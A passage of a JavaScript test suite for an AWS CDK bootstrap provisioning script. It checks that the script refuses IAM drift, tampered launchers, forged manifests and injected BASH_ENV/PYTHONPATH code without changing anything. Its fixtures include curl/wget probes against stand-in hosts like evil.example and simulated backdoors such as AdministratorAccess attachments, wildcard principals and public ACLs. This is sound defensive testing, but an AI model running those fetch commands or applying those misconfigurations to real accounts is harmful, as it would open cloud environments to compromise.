    assert.equal(/ParameterValue=[^ ]*,/.test(args), false, 'nenhuma virgula escapada no shorthand da CLI — os parametros viajam por arquivo');
    assert.ok(paramsOf(r).find((x) => x.ParameterKey === 'CloudFormationExecutionPolicies').ParameterValue === cfg.execArns.join(','),
      'o parametro nomeia os TRES shards, na ordem revisada');
    assert.ok(paramsOf(r).find((x) => x.ParameterKey === 'Qualifier').ParameterValue === cfg.qualifier);
    assert.match(args, /--capabilities CAPABILITY_NAMED_IAM/);
    assert.match(args, /--enable-termination-protection/);
    assert.equal(r.mutations.filter((m) => m.startsWith('create-policy')).length, 0, 'this phase never creates a policy');
    assert.deepEqual(r.npxCalls, [], 'npx/cdk NEVER runs under the operator script (r3-F1)');
    assert.match(r.out, /snapshot revisado do SHA autorizado/);
    assert.match(r.out, /READ-BACK OK/);
    assert.ok(!r.out.includes(ACCOUNT), 'no account id in the output');
  });

  test(`EXECUTED bootstrap reentrant (${env}): full read-back against the model, zero mutation`, () => {
    const r = run(env, 'bootstrap', {});
    assert.equal(r.code, 0, r.out);
    assert.deepEqual(r.mutations, []);
    assert.deepEqual(r.npxCalls, []);
    assert.match(r.out, /reentrada, zero mutacao/);
  });
}

test('EXECUTED bootstrap role divergences (r2-F2): widened trust, extra principal, dropped condition, admin inline, extra managed, missing tag — each refuses with zero mutation (dev)', () => {
  const m = ENVS.dev.model;
  const names = Object.fromEntries(Object.entries(m.roles).map(([lid, r]) => [lid, r.name]));
  const cases = [
    ['wildcard principal', (S) => { S.live.roles[names.DeploymentActionRole].trust.Statement[0].Principal = { AWS: '*' }; }, /DeploymentActionRole: the trust document diverges/],
    ['extra same-account principal', (S) => { S.live.roles[names.FilePublishingRole].trust.Statement[0].Principal.AWS = [`arn:aws:iam::${ACCOUNT}:root`, `arn:aws:iam::${ACCOUNT}:role/other`]; }, /FilePublishingRole: the trust document diverges/],
    ['dropped ExternalId condition', (S) => { delete S.live.roles[names.LookupRole].trust.Statement[0].Condition; }, /LookupRole: the trust document diverges/],
    ['foreign service principal on exec', (S) => { S.live.roles[names.CloudFormationExecutionRole].trust.Statement.push({ Action: 'sts:AssumeRole', Effect: 'Allow', Principal: { Service: 'lambda.amazonaws.com' } }); }, /CloudFormationExecutionRole: the trust document diverges/],
    ['administrative inline doc', (S) => { S.live.roles[names.DeploymentActionRole].inline.default = { Version: '2012-10-17', Statement: [{ Effect: 'Allow', Action: '*', Resource: '*' }] }; }, /inline policy default diverges/],
    ['extra inline policy', (S) => { S.live.roles[names.ImagePublishingRole].inline.backdoor = { Version: '2012-10-17', Statement: [] }; }, /inline policy NAME set diverges/],
    ['extra managed on lookup', (S) => { S.live.roles[names.LookupRole].attached = [...S.live.roles[names.LookupRole].attached, 'arn:aws:iam::aws:policy/AdministratorAccess']; }, /managed policy set diverges/],
    ['missing bootstrap-role tag', (S) => { S.live.roles[names.FilePublishingRole].tags = []; }, /tag set diverges/],
    ['unexpected boundary', (S) => { S.live.roles[names.LookupRole].boundary = `arn:aws:iam::${ACCOUNT}:policy/foreign`; }, /permissions boundary diverges/],
  ];
  for (const [label, mutate, re] of cases) {
    const r = run('dev', 'bootstrap', {}, mutate);
    assert.notEqual(r.code, 0, label);
    assert.match(r.out, re, label);
    assert.deepEqual(r.mutations, [], `${label}: zero mutation`);
  }
});

test('EXECUTED bootstrap stack/resource/data divergences (r2-F1): each refuses with zero mutation (dev)', () => {
  const cases = [
    ['termination protection off', { termProt: false }, /termination protection is not enabled/],
    ['non-terminal status', { stackStatus: 'UPDATE_ROLLBACK_COMPLETE' }, /not a terminal COMPLETE state/],
    ['service role present', { stackRoleArn: `arn:aws:iam::${ACCOUNT}:role/svc` }, /unexpected service role/],
    ['stored template diverges', { storedTemplate: 'Resources: {}\n' }, /stored template diverges/],
    ['stack policy present', { stackPolicy: true }, /unexpected stack policy/],
    ['truncated listing', { resourcesNextToken: true }, /paginated\/truncated/],
  ];
  for (const [label, scen, re] of cases) {
    const r = run('dev', 'bootstrap', scen);
    assert.notEqual(r.code, 0, label);
    assert.match(r.out, re, label);
    assert.deepEqual(r.mutations, [], `${label}: zero mutation`);
  }
  const mutCases = [
    ['extra deployed resource', (S) => { S.live.resources.push({ LogicalResourceId: 'Backdoor', ResourceType: 'AWS::IAM::Role', ResourceStatus: 'CREATE_COMPLETE', PhysicalResourceId: 'x' }); }, /deployed but the template declares no such resource/],
    ['missing NON-CORE resource', (S) => { S.live.resources = S.live.resources.filter((r) => r.LogicalResourceId !== 'StagingBucketPolicy'); }, /StagingBucketPolicy is declared by the template but not deployed/],
    ['resource in progress', (S) => { S.live.resources[0].ResourceStatus = 'UPDATE_IN_PROGRESS'; }, /is in state UPDATE_IN_PROGRESS/],
    ['bucket policy divergence', (S) => { S.live.bucketPolicy = { Version: '2012-10-17', Statement: [] }; }, /bucket policy diverges/],
    ['ssm version divergence', (S) => { S.live.ssmValue = '7'; }, /diverges from the template's 32/],
    ['ecr lifecycle divergence', (S) => { S.live.ecr.lifecycle = { rules: [] }; }, /lifecycle policy diverges/],
    ['kms key policy divergence', (S) => { S.live.kms.keyPolicy = { Version: '2012-10-17', Statement: [] }; }, /key policy diverges/],
    ['kms alias absent', (S) => { S.aliasesOverride = []; }, /template alias is absent/],
    // r3-F3: the three named adversarials — destructive lifecycle, 12h sessions, BootstrapVariant.
    ['DESTRUCTIVE bucket lifecycle rule', (S) => { S.live.bucketLifecycle = [...S.live.bucketLifecycle, { Id: 'ExpireEverything', Status: 'Enabled', Expiration: { Days: 1 } }]; }, /lifecycle configuration diverges .* expire live assets/],
    ['12-hour session on the deploy role', (S) => { const n = Object.keys(S.live.roles).find((k) => k.includes('-deploy-role-')); S.live.roles[n].maxSession = 43200; }, /MaxSessionDuration diverges/],
    ['BootstrapVariant divergence', (S) => { S.live.stackParams = S.live.stackParams.map((p) => (p.ParameterKey === 'BootstrapVariant' ? { ...p, ParameterValue: 'Someone Elses Bootstrap' } : p)); }, /parameter BootstrapVariant diverges/],
    ['smuggled extra parameter', (S) => { S.live.stackParams.push({ ParameterKey: 'Backdoor', ParameterValue: 'x' }); }, /unexpected parameter Backdoor/],
    ['non-owner ACL grant', (S) => { S.aclOverride = [{ Grantee: { ID: 'owner-id', Type: 'CanonicalUser' }, Permission: 'FULL_CONTROL' }, { Grantee: { URI: 'http://acs.amazonaws.com/groups/global/AllUsers', Type: 'Group' }, Permission: 'READ' }]; }, /ACL is not owner-only/],
  ];
  for (const [label, mutate, re] of mutCases) {
    const r = run('dev', 'bootstrap', {}, mutate);
    assert.notEqual(r.code, 0, label);
    assert.match(r.out, re, label);
    assert.deepEqual(r.mutations, [], `${label}: zero mutation`);
  }
});

test('EXECUTED bootstrap precondition: absent/divergent policy stops before any mutation (dev)', () => {
  const r = run('dev', 'bootstrap', { policyAbsent: [ENVS.dev.policyNames[2]], stackExists: false });
  assert.notEqual(r.code, 0);
  assert.deepEqual(r.mutations, []);
  assert.deepEqual(r.npxCalls, []);
});

test('EXECUTED bootstrap failure and TIMEOUTS (r2-F5/r3-F2): named refusals, reconciliation, one attempt', () => {
  const createFail = run('dev', 'bootstrap', { stackExists: false, createRc: 1 });
  assert.notEqual(createFail.code, 0);
  assert.match(createFail.out, /FAILED at create-stack/);
  assert.equal(createFail.mutations.filter((m) => m.startsWith('create-stack')).length, 1);
  assert.ok(!createFail.out.includes(ACCOUNT));

  const waitFail = run('dev', 'bootstrap', { stackExists: false, waitRc: 255 });
  assert.notEqual(waitFail.code, 0);
  assert.match(waitFail.out, /FAILED while waiting/);
  assert.match(waitFail.out, /NENHUM retry foi tentado/);
  assert.equal(waitFail.mutations.filter((m) => m.startsWith('create-stack')).length, 1);

  const hungObs = run('dev', 'policies', { hang: 'iam get-policy', timeouts: { CBA_OBSERVE_TIMEOUT_SECONDS: '1' } });
  assert.notEqual(hungObs.code, 0);
  assert.match(hungObs.out, /OBSERVATION_TIMEOUT/);
  assert.deepEqual(hungObs.mutations, [], 'a hung observation mutates nothing');

  const hungBoot = run('dev', 'bootstrap', { stackExists: false, hangWait: true, timeouts: { CBA_BOOTSTRAP_TIMEOUT_SECONDS: '1' } });
  assert.notEqual(hungBoot.code, 0);
  assert.match(hungBoot.out, /BOOTSTRAP TIMEOUT .*INDETERMINATE/);
  assert.match(hungBoot.out, /reconciliation/);
  assert.equal(hungBoot.mutations.filter((m) => m.startsWith('create-stack')).length, 1, 'exactly one attempt, never retried');
});

test('EXECUTED r3-F2: a same-group child trying a DELAYED mutation dies with the group — the mutation never lands', async () => {
  const r = run('dev', 'bootstrap', { stackExists: false, hangWait: true, delayedChild: true, keepDir: true, timeouts: { CBA_BOOTSTRAP_TIMEOUT_SECONDS: '1' } });
  try {
    assert.notEqual(r.code, 0);
    assert.match(r.out, /killed and reaped/);
    // The child scheduled its write for T+3s; the group was killed at T+1s. The mutations file
    // SURVIVES past T+3s (keepDir), so a still-alive child could land its write — re-read and
    // prove it never does.
    await new Promise((resolve) => { setTimeout(resolve, 3500); });
    const after = fs.readFileSync(r.mutPath, 'utf8').split('\n').filter(Boolean);
    assert.ok(!after.includes('delayed-mutation'), 'the delayed mutation must never land');
  } finally {
    fs.rmSync(r.dir, { recursive: true, force: true });
  }
});

test('EXECUTED r6-F1: the launcher that RUNS comes from the commit object store, not the worktree', () => {
  // The runbook sequence, performed literally: `git show <SHA>:scripts/provision.sh > L; bash L`.
  // The worktree's launcher is tampered with a prefix that would fire before any check; the
  // commit's copy is pristine. If the worktree bytes were what ran, the marker would appear.
  const pristine = fs.mkdtempSync(path.join(os.tmpdir(), 'cba-pristine-'));
  const tampered = fs.mkdtempSync(path.join(os.tmpdir(), 'cba-tampered-'));
  try {
    for (const sub of ['scripts', 'infra/aws/bootstrap']) {
      fs.cpSync(path.join(ROOT, sub), path.join(pristine, sub), { recursive: true, filter: (s) => !s.includes('__pycache__') });
      fs.cpSync(path.join(ROOT, sub), path.join(tampered, sub), { recursive: true, filter: (s) => !s.includes('__pycache__') });
    }
    fs.writeFileSync(path.join(tampered, '.git'), 'gitdir: fake');
    for (const victim of ['scripts/provision.sh', 'scripts/provision-release-bootstrap.sh']) {
      const f = path.join(tampered, victim);
      const bodyLines = fs.readFileSync(f, 'utf8').split('\n');
      bodyLines.splice(1, 0, 'echo "TAMPERED PREFIX RAN"; exit 0');
      fs.writeFileSync(f, bodyLines.join('\n'));
    }
    // The operator's command extracts the launcher from the SHA — the fake git serves the
    // pristine commit content — and runs THAT copy, with the tampered worktree as CBA_REPO_ROOT.
    const extracted = path.join(tampered, 'extracted-launcher.sh');
    const r = run('dev', 'policies', {
      repoRoot: tampered,
      pristineRoot: pristine,
      extractLauncherTo: extracted,
    });
    assert.ok(!r.out.includes('TAMPERED PREFIX RAN'), 'no tampered prefix may execute');
    assert.equal(r.code, 0, r.out);
    assert.match(r.out, /arvore materializada verificada/);
    assert.match(r.out, /POLICIES OK/);
  } finally {
    fs.rmSync(pristine, { recursive: true, force: true });
    fs.rmSync(tampered, { recursive: true, force: true });
  }
});

test('EXECUTED r6-F2: a FORGED materialized root is refused — worktree, writable, or stale', () => {
  // Round 5 compared two controllable strings, so CBA_MATERIALIZED_ROOT=<worktree> walked in.
  // The tree must now BE the launcher's product: outside any worktree, write-stripped, and
  // carrying a manifest that names this SHA and matches its contents exactly.
  const commonEnv = { PATH: process.env.PATH, CBA_EXPECTED_ACCOUNT_ID: ACCOUNT, CBA_AUTHORIZED_SHA: SHA };
  const attempt = (root, script) => {
    let out = ''; let code = 0;
    try {
      out = execFileSync('bash', [script ?? path.join(root, 'scripts/provision-release-bootstrap.sh'), 'dev', 'policies'],
        { encoding: 'utf8', env: { ...commonEnv, CBA_MATERIALIZED_ROOT: root } });
    } catch (e) { out = `${e.stdout ?? ''}${e.stderr ?? ''}`; code = e.status ?? 1; }
    return { out, code };
  };

  // (a) the WORKTREE itself — the attack round 5 allowed.
  const worktree = attempt(ROOT);
  assert.notEqual(worktree.code, 0);
  assert.match(worktree.out, /inside a git worktree/);

  // (b) a hand-made tree outside any worktree: writable, so refused before anything else.
  const fake = fs.mkdtempSync(path.join(os.tmpdir(), 'cba-fake-root-'));
  const pristineRunner = fs.readFileSync(path.join(ROOT, 'scripts/lib/bounded-run.py'));
  try {
    fs.mkdirSync(path.join(fake, 'scripts/lib'), { recursive: true });
    fs.cpSync(path.join(ROOT, 'scripts'), path.join(fake, 'scripts'), { recursive: true, filter: (s) => !s.includes('__pycache__') });
    const writable = attempt(fake);
    assert.notEqual(writable.code, 0);
    assert.match(writable.out, /is writable/);

    // (c) write-stripped but with NO manifest.
    execFileSync('chmod', ['-R', 'a-w', fake]);
    const noManifest = attempt(fake);
    assert.notEqual(noManifest.code, 0);
    assert.match(noManifest.out, /carries no manifest/);

    // (d) a STALE tree: a real manifest, but naming a different authorization.
    execFileSync('chmod', ['-R', 'u+w', fake]);
    const digests = execFileSync('bash', ['-c', `cd '${fake}' && find . -type f -print0 | LC_ALL=C sort -z | xargs -0 sha256sum`], { encoding: 'utf8' });
    fs.writeFileSync(path.join(fake, '.cba-manifest'), `SHA ${'a'.repeat(40)}\n${digests}`);
    execFileSync('chmod', ['-R', 'a-w', fake]);
    const stale = attempt(fake);
    assert.notEqual(stale.code, 0);
    assert.match(stale.out, /does not name the authorized SHA/);

    // (e) right SHA, but a file was edited after the manifest was written.
    execFileSync('chmod', ['-R', 'u+w', fake]);
    fs.writeFileSync(path.join(fake, '.cba-manifest'), `SHA ${SHA}\n${digests}`);
    fs.appendFileSync(path.join(fake, 'scripts/lib/bounded-run.py'), '\n# swapped after the manifest\n');
    execFileSync('chmod', ['-R', 'a-w', fake]);
    const swapped = attempt(fake);
    assert.notEqual(swapped.code, 0);
    assert.match(swapped.out, /diverges from its manifest/);

    // (f) an EXTRA file the manifest does not list. (The swapped file is restored from the bytes
    //     captured at the top of this test — a test must never write to the real worktree.)
    execFileSync('chmod', ['-R', 'u+w', fake]);
    fs.writeFileSync(path.join(fake, 'scripts/lib/bounded-run.py'), pristineRunner);
    fs.writeFileSync(path.join(fake, 'scripts/lib/sitecustomize.py'), 'print("injected")\n');
    execFileSync('chmod', ['-R', 'a-w', fake]);
    const extra = attempt(fake);
    assert.notEqual(extra.code, 0);
    assert.match(extra.out, /path set is not exactly the tree's contents/);
  } finally {
    try { execFileSync('chmod', ['-R', 'u+w', fake]); } catch { /* already writable */ }
    fs.rmSync(fake, { recursive: true, force: true });
  }
});

test('EXECUTED r6-F2: the launcher LEAVES NO TREE behind — the cleanup trap survives the run', () => {
  // Compare the SET, not the count: a tree left behind by an earlier test would otherwise make
  // this one fail for someone else's reason, and a tree cleaned up by an earlier test would mask
  // a leak here. What this proves is that THESE two runs leave nothing of their own.
  const trees = () => new Set(fs.readdirSync('/tmp').filter((n) => n.startsWith('cba-relboot-src.')));
  const before = trees();
  const ok = run('dev', 'policies', {});
  assert.equal(ok.code, 0, ok.out);
  const failed = run('dev', 'policies', { policyErr: { [ENVS.dev.policyNames[0]]: 'An error occurred (AccessDenied)' } });
  assert.notEqual(failed.code, 0);
  const leaked = [...trees()].filter((n) => !before.has(n));
  assert.deepEqual(leaked, [], 'neither a successful nor a failed run may leave a materialized tree in /tmp');
});

test('EXECUTED r6-F4: ambient PYTHONPATH/sitecustomize cannot inject code into any helper', () => {
  // `python3 -I` plus the runner's scrubbed child environment: a sitecustomize on PYTHONPATH
  // would otherwise execute at interpreter start-up, under the operator's credentials and before
  // any deadline applies.
  const evil = fs.mkdtempSync(path.join(os.tmpdir(), 'cba-evil-py-'));
  try {
    fs.writeFileSync(path.join(evil, 'sitecustomize.py'), 'import sys; sys.stderr.write("SITECUSTOMIZE EXECUTED\\n")\n');
    const r = run('dev', 'policies', { pythonEnv: { PYTHONPATH: evil, PYTHONSTARTUP: path.join(evil, 'sitecustomize.py') } });
    assert.equal(r.code, 0, r.out);
    assert.ok(!r.out.includes('SITECUSTOMIZE EXECUTED'), 'ambient Python code must never execute');
    assert.match(r.out, /POLICIES OK/);
  } finally {
    fs.rmSync(evil, { recursive: true, force: true });
  }
});

test('EXECUTED r7-F1: BASH_ENV and exported functions never run before the reviewed bytes', () => {
  // A non-interactive bash SOURCES $BASH_ENV and imports exported functions before the script's
  // first line — so `bash -p` at BOTH hops is the control, not a nicety.
  const evil = fs.mkdtempSync(path.join(os.tmpdir(), 'cba-bashenv-'));
  try {
    const marker = path.join(evil, 'marker.txt');
    fs.writeFileSync(path.join(evil, 'bashenv.sh'), `echo "BASH_ENV EXECUTED"; printf ran > '${marker}'\n`);
    const r = run('dev', 'policies', {
      pythonEnv: {
        BASH_ENV: path.join(evil, 'bashenv.sh'),
        ENV: path.join(evil, 'bashenv.sh'),
        // An exported shell function that would shadow a real command if inherited.
        'BASH_FUNC_sha256sum%%': '() { echo "FUNCTION HIJACK"; }',
      },
    });
    assert.equal(r.code, 0, r.out);
    assert.ok(!r.out.includes('BASH_ENV EXECUTED'), 'BASH_ENV must never execute');
    assert.ok(!r.out.includes('FUNCTION HIJACK'), 'an inherited function must never shadow a command');
    assert.equal(fs.existsSync(marker), false, 'BASH_ENV left no side effect');
    assert.match(r.out, /POLICIES OK/);
  } finally {
    fs.rmSync(evil, { recursive: true, force: true });
  }
});

test('EXECUTED r7-F2: the LITERAL runbook block propagates failure and leaves no launcher file', () => {
  // The canonical command is executed exactly as documented — extracted from the runbook — so a
  // masked status cannot hide behind a helper the tests wrote themselves.
  const doc = fs.readFileSync(path.join(ROOT, 'docs/architecture/aws-bootstrap-and-oidc.md'), 'utf8');
  const fences = [...doc.matchAll(/```bash\n([\s\S]*?)```/g)].map((m) => m[1]);
  const block = fences.filter((b) => b.includes('git -C "$REPO" show'));
  assert.equal(block.length, 1, 'exactly one runbook block carries the canonical launcher command');
  const template = block[0]
    .split('\n').filter((l) => !l.trim().startsWith('#')).join('\n')
    .replace('<account>', ACCOUNT)
    .replace(/dev policies\s*$/m, 'dev policies');
  assert.match(template, /set -euo pipefail/, 'the block runs strict');
  assert.match(template, /trap 'rm -f "\$L"' EXIT/, 'the block cleans up through a trap');
  assert.match(template, /bash -p "\$L"/, 'the block invokes bash in privileged mode');

  const before = fs.readdirSync('/tmp').filter((n) => n.startsWith('cba-launch.')).length;
  const runBlock = (scen) => {
    const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'cba-block-'));
    // Reuse the harness's fakes by running one normal scenario first to materialize them.
    const shim = run('dev', 'policies', { ...scen, keepDir: true });
    const script = `REPO='${ROOT}'\nSHA='${scen.badSha ?? SHA}'\n${template}`;
    let out = ''; let code = 0;
    try {
      out = execFileSync('bash', ['-c', script], {
        encoding: 'utf8',
        env: { PATH: `${shim.dir}:${process.env.PATH}`, CBA_REPO_ROOT: ROOT },
      });
    } catch (e) { out = `${e.stdout ?? ''}${e.stderr ?? ''}`; code = e.status ?? 1; }
    fs.rmSync(shim.dir, { recursive: true, force: true });
    fs.rmSync(dir, { recursive: true, force: true });
    return { out, code };
  };

  const ok = runBlock({});
  assert.equal(ok.code, 0, ok.out);
  assert.match(ok.out, /POLICIES OK/);

  // (a) EXTRACTION itself fails — `git show` errors and emits no bytes (r8-F2). The status must
  //     survive the cleanup, and the launcher must never have started.
  const badExtract = runBlock({ showFail: true });
  assert.notEqual(badExtract.code, 0, 'a failed extraction must not be masked by the cleanup');
  assert.ok(!badExtract.out.includes('launcher:'), 'the launcher must not run when extraction failed');
  assert.ok(!badExtract.out.includes('POLICIES OK'), 'nothing may be provisioned after a failed extraction');

  // (b) the provisioner itself refuses — its status must reach the operator.
  const childFails = runBlock({ policyErr: { [ENVS.dev.policyNames[0]]: 'An error occurred (AccessDenied)' } });
  assert.notEqual(childFails.code, 0, "the child's failure must not be masked");

  const after = fs.readdirSync('/tmp').filter((n) => n.startsWith('cba-launch.')).length;
  assert.equal(after, before, 'the block leaves no extracted launcher behind');
});

test('EXECUTED r7-F3: a manifest that duplicates one path to hide another is refused', () => {
  // Codex's repro: omit one digest line, duplicate a valid one so the COUNT still matches, and
  // change the omitted file. Counting accepted it; exact path-set equality does not.
  const fake = fs.mkdtempSync(path.join(os.tmpdir(), 'cba-dup-manifest-'));
  try {
    fs.cpSync(path.join(ROOT, 'scripts'), path.join(fake, 'scripts'), { recursive: true, filter: (s) => !s.includes('__pycache__') });
    const digests = execFileSync('bash', ['-c', `cd '${fake}' && find . -type f -print0 | LC_ALL=C sort -z | xargs -0 sha256sum`], { encoding: 'utf8' })
      .split('\n').filter(Boolean);
    const victim = digests.findIndex((l) => l.endsWith('bounded-run.py'));
    assert.notEqual(victim, -1);
    const other = digests[victim === 0 ? 1 : 0];
    const forged = digests.filter((_, i) => i !== victim).concat([other]);   // same COUNT, one path duplicated
    fs.writeFileSync(path.join(fake, '.cba-manifest'), `SHA ${SHA}\n${forged.join('\n')}\n`);
    fs.appendFileSync(path.join(fake, 'scripts/lib/bounded-run.py'), '\n# swapped behind the count\n');
    execFileSync('chmod', ['-R', 'a-w', fake]);
    let out = ''; let code = 0;
    try {
      out = execFileSync('bash', ['-p', path.join(fake, 'scripts/provision-release-bootstrap.sh'), 'dev', 'policies'], {
        encoding: 'utf8',
        env: { PATH: process.env.PATH, CBA_EXPECTED_ACCOUNT_ID: ACCOUNT, CBA_AUTHORIZED_SHA: SHA, CBA_MATERIALIZED_ROOT: fake },
      });
    } catch (e) { out = `${e.stdout ?? ''}${e.stderr ?? ''}`; code = e.status ?? 1; }
    assert.notEqual(code, 0);
    assert.match(out, /path set is not exactly the tree's contents/);
    assert.ok(!out.includes('arvore materializada verificada'), 'the forged tree never verifies');
  } finally {
    try { execFileSync('chmod', ['-R', 'u+w', fake]); } catch { /* already writable */ }
    fs.rmSync(fake, { recursive: true, force: true });
  }
});

test('r9: MUTATING THE REAL LAUNCHER with each bypass form changes the inventory', () => {
  // The strongest form of the guarantee: the probes are appended to the ACTUAL launcher, and the
  // inventory must differ. Codex's three round-9 forms are the first three; the last three prove
  // the analyzer FAILS CLOSED on options it does not model instead of skipping them.
  const tool = path.join(ROOT, 'test/lib/shell-command-inventory.py');
  const inventoryOf = (file) => execFileSync('python3', [tool, file], { encoding: 'utf8' }).split('\n').filter(Boolean);
  const baseline = inventoryOf(LAUNCHER);
  const cases = [
    ['bash -lc "curl https://example.invalid"', 'curl'],          // bundle carrying `c`
    ['timeout -k 1 5 curl https://example.invalid', 'curl'],      // option with its own argument
    ['! curl https://example.invalid', 'curl'],                   // negation keeps command position
    ['bash --unknown-opt x', 'UNMODELED_WRAPPER_OPTION'],
    ['timeout --bogus 5 curl x', 'UNMODELED_WRAPPER_OPTION'],
    ['env -S "curl -s x"', 'ENV_SPLIT_STRING'],
  ];
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'cba-inv-mut-'));
  try {
    for (const [probe, expected] of cases) {
      const mutated = path.join(dir, 'mutated.sh');
      fs.writeFileSync(mutated, `${fs.readFileSync(LAUNCHER, 'utf8')}\n${probe}\n`);
      const found = inventoryOf(mutated);
      assert.ok(found.includes(expected), `"${probe}" must add ${expected}: got ${found.join(',')}`);
      assert.notDeepEqual(found, baseline, `"${probe}" must change the inventory`);
    }
  } finally {
    fs.rmSync(dir, { recursive: true, force: true });
  }
});

test('r7-F4: the inventory catches wrapper, absolute-path and dynamic command forms', () => {
  // The bypasses Codex demonstrated, pinned as executed proofs of the TOOL itself.
  const probe = path.join(os.tmpdir(), `cba-inv-probe-${process.pid}.sh`);
  fs.writeFileSync(probe, [
    '#!/usr/bin/env bash',
    'command curl -s https://evil.example',
    '/usr/bin/wget http://evil.example',
    '$CMD --do-it',
    'env -u X bash -p ./child.sh',
    'timeout 5 git status',
    'timeout "$T" git log',
    'case "$X" in dev|pilot) : ;; esac',
    'A=( "$B" "$C" )',
    'for n in "${A[@]}"; do echo "$n" > "$F"; done',
    '',
  ].join('\n'));
  try {
    const found = execFileSync('python3', [path.join(ROOT, 'test/lib/shell-command-inventory.py'), probe], { encoding: 'utf8' })
      .split('\n').filter(Boolean);
    for (const expected of ['curl', 'wget', 'DYNAMIC_COMMAND', 'bash', 'git', 'env', 'timeout']) {
      assert.ok(found.includes(expected), `the inventory must report ${expected}: got ${found.join(',')}`);
    }
  } finally {
    fs.rmSync(probe, { force: true });
  }
});

test('EXECUTED r5-F2: a FAILED or HUNG git probe is never a clean answer — refuses with ZERO aws calls', () => {
  const cases = [
    [{ probeFail: 'rev-parse' }, /git probe for HEAD failed/],
    [{ probeFail: 'status' }, /git probe for the worktree state failed/],
    [{ probeHang: 'status', timeouts: { CBA_GIT_TIMEOUT_SECONDS: '1' } }, /git probe for the worktree state exceeded its deadline/],
    [{ timeouts: { CBA_GIT_TIMEOUT_SECONDS: '0' } }, /CBA_GIT_TIMEOUT_SECONDS must be a positive integer/],
    [{ authorizedSha: 'abc123' }, /CBA_AUTHORIZED_SHA is required/],
    [{ gitHead: 'e'.repeat(40) }, /HEAD does not match/],
    [{ gitDirty: true }, /worktree is dirty/],
  ];
  for (const [scen, re] of cases) {
    const r = run('dev', 'policies', scen);
    assert.notEqual(r.code, 0, JSON.stringify(scen));
    assert.match(r.out, re, JSON.stringify(scen));
    assert.deepEqual(r.mutations, [], 'zero mutation');
    assert.deepEqual(r.awsCalls, [], `${JSON.stringify(scen)}: ZERO aws calls — not even STS`);
  }
});

test('EXECUTED r4-F2: a SIGTERM-IGNORING descendant is killed with the group — the late mutation never lands', async () => {
  const r = run('dev', 'bootstrap', { stackExists: false, hangWait: true, stubbornChild: true, keepDir: true, timeouts: { CBA_BOOTSTRAP_TIMEOUT_SECONDS: '1' } });
  try {
    assert.notEqual(r.code, 0);
    assert.match(r.out, /killed and reaped/);
    // The stubborn child ignores SIGTERM and writes at T+3s; the group was killed at T+1s.
    await new Promise((resolve) => { setTimeout(resolve, 3500); });
    const after = fs.readFileSync(r.mutPath, 'utf8').split('\n').filter(Boolean);
    assert.ok(!after.includes('delayed-mutation'), 'a SIGTERM-ignoring survivor must not outlive the deadline');
  } finally {
    fs.rmSync(r.dir, { recursive: true, force: true });
  }
});

test('EXECUTED r4-F3: every mutation failure path reconciles ONCE, read-only, with no retry', () => {
  const cases = [
    ['AWS accepted, transport failed', { createAcceptedThenFailed: true }, /FAILED at create-stack/, /reconciliation — stack status: CREATE_COMPLETE/],
    ['create-stack error', { createRc: 1 }, /FAILED at create-stack/, /reconciliation — stack status: does not exist/],
    ['create-stack timeout', { hangCreate: true, timeouts: { CBA_OBSERVE_TIMEOUT_SECONDS: '1' } }, /TIMEOUT at create-stack/, /reconciliation — stack status:/],
    ['waiter error', { waitRc: 255 }, /FAILED while waiting/, /reconciliation — stack status: CREATE_COMPLETE/],
    ['waiter timeout', { hangWait: true, timeouts: { CBA_BOOTSTRAP_TIMEOUT_SECONDS: '1' } }, /TIMEOUT while waiting/, /reconciliation — stack status:/],
  ];
  for (const [label, scen, headline, status] of cases) {
    const r = run('dev', 'bootstrap', { stackExists: false, ...scen });
    assert.notEqual(r.code, 0, label);
    assert.match(r.out, headline, label);
    assert.match(r.out, status, label);
    assert.match(r.out, /NENHUM retry foi tentado/, label);
    assert.equal(reconcileProbes(r), 1, `${label}: EXACTLY one describe-stacks in reconciliation`);
    assert.equal(r.mutations.filter((m) => m.startsWith('create-stack')).length, 1, `${label}: exactly one create-stack attempt`);
    assert.ok(!r.out.includes(ACCOUNT), `${label}: masked output`);
  }
});

test('EXECUTED r3-F2: zero, garbage and above-ceiling timeouts are REFUSED — never a disabled deadline', () => {
  const cases = [
    [{ CBA_OBSERVE_TIMEOUT_SECONDS: '0' }, /must be a positive integer no greater than 600/],
    [{ CBA_OBSERVE_TIMEOUT_SECONDS: 'abc' }, /must be a positive integer no greater than 600/],
    [{ CBA_OBSERVE_TIMEOUT_SECONDS: '9999' }, /must be a positive integer no greater than 600/],
    [{ CBA_BOOTSTRAP_TIMEOUT_SECONDS: '0' }, /must be a positive integer no greater than 7200/],
    [{ CBA_BOOTSTRAP_TIMEOUT_SECONDS: '99999' }, /must be a positive integer no greater than 7200/],
  ];
  for (const [timeouts, re] of cases) {
    const r = run('dev', 'policies', { timeouts });
    assert.notEqual(r.code, 0, JSON.stringify(timeouts));
    assert.match(r.out, re, JSON.stringify(timeouts));
    assert.deepEqual(r.mutations, [], 'zero mutation');
  }
});

/* ═══════════ common bindings and the closed CLI ═══════════ */

test('EXECUTED bindings: account, SHA, worktree, CDK — each refuses with ZERO mutation, nothing echoed', () => {
  const cases = [
    ['policies', { expectedEnv: '999988887777' }, /do not belong to the authorized account/],
    ['policies', { expectedEnv: null }, /CBA_EXPECTED_ACCOUNT_ID is required/],
    ['policies', { expectedEnv: '12345' }, /CBA_EXPECTED_ACCOUNT_ID is required/],
    ['policies', { stsOut: 'not-a-number' }, /STS account is malformed/],
    ['policies', { stsErr: 'AccessDenied' }, /STS identity observation failed/],
    ['policies', { authorizedSha: null }, /CBA_AUTHORIZED_SHA is required/],
    ['policies', { authorizedSha: 'abc123' }, /CBA_AUTHORIZED_SHA is required/],
    ['policies', { gitHead: 'e'.repeat(40) }, /HEAD does not match/],
    ['policies', { gitDirty: true }, /worktree is dirty/],
  ];
  for (const [phase, scen, re] of cases) {
    const r = run('dev', phase, scen);
    assert.notEqual(r.code, 0, JSON.stringify(scen));
    assert.match(r.out, re, JSON.stringify(scen));
    assert.deepEqual(r.mutations, [], `${JSON.stringify(scen)}: zero mutation`);
    assert.ok(!r.out.includes('999988887777') && !r.out.includes(ACCOUNT), 'no account echoed');
  }
});

test('EXECUTED observation errors are NEVER absence — zero mutation', () => {
  const cases = [
    ['policies', { policyErr: { [ENVS.dev.policyNames[0]]: 'An error occurred (AccessDenied)' } }],
    ['bootstrap', { stackErr: 'An error occurred (AccessDenied) when calling DescribeStacks' }],
  ];
  for (const [phase, scen] of cases) {
